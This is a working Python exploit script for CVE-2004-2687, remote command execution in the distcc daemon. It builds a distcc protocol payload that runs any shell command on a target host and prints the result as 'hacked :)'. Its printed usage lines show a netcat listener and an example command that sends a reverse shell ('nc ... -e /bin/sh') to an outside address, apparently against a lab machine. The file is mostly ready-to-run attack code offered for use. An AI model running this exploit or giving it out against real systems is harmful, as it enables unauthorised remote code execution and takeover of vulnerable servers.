import socket
import random
import argparse
import string
from log_colors import *

# CVE-2004-2687
class CVE2004_2687:

    def __init__(self, host, port):
        print (LogColors.BLUE + "victim: " + host + ":" + port + "..." + LogColors.ENDC)
        self.host = host
        self.port = port

    def _rnd(self, length):
        rnd = ""
        for i in range(length):
            rnd += random.choice(string.ascii_letters + string.digits)
        return rnd
    
    def _read(self, sock):
        sock.recv(4)
        l = int(sock.recv(8), 16)
        if l != 0:
            return sock.recv(l)

    def run(self, cmd):
        print (LogColors.BLUE + "cmd: " + cmd + LogColors.ENDC)
        args = ["sh", "-c", cmd, "#", "-c", "main.c", "-o", "main.o"]
        payload = "DIST00000001" + "ARGC%.8x" % len(args)
        for arg in args:
            payload += "ARGV%.8x%s" % (len(arg), arg)

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket.setdefaulttimeout(5)
        sock.settimeout(5)

        if sock.connect_ex((self.host, self.port)) == 0:
            print (LogColors.YELLOW + 'connected...' + LogColors.ENDC)
            try:
                sock.send(payload)
                dtag = "DOTI0000000A" + self._rnd(10)
                sock.send(dtag)
                sock.recv(24)
                print (LogColors.YELLOW + 'begin buffer...' + LogColors.ENDC)
                buff = self._read(sock)
                if buff:
                    print (LogColors.YELLOW + str(buff) + LogColors.ENDC)
                print (LogColors.YELLOW + 'end buffer...' + LogColors.ENDC)
                print (LogColors.GREEN + 'hacked :)' + LogColors.ENDC)
            except socket.timeout:
                print (LogColors.YELLOW + 'socket timout' + LogColors.ENDC)
            except Exception:
                print (LogColors.YELLOW + 'error :(' + LogColors.ENDC) 
        else:
            print (LogColors.RED + "failed to connect " + self.host + ":" + self.port + " :(" + LogColors.ENDC)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-t','--target', required = True, help = "target ip/host")
    parser.add_argument('-p', '--port', required = True, help = "port with a shell")
    parser.add_argument('-c', '--cmd', required = True, help = "command to run on target host")
    args = vars(parser.parse_args())
    print (LogColors.GREEN + '$nc -nvlp 4444' + LogColors.ENDC)
    print (LogColors.GREEN + '$python cve_2004_2687.py -t 10.10.10.3 -p 3632 -c "nc 10.10.14.12 4444 -e /bin/sh"' + LogColors.ENDC)
    host, port = args['target'], args['port']
    cmd = args['cmd']
    cve = CVE2004_2687(host, port)
    cve.run(cmd)

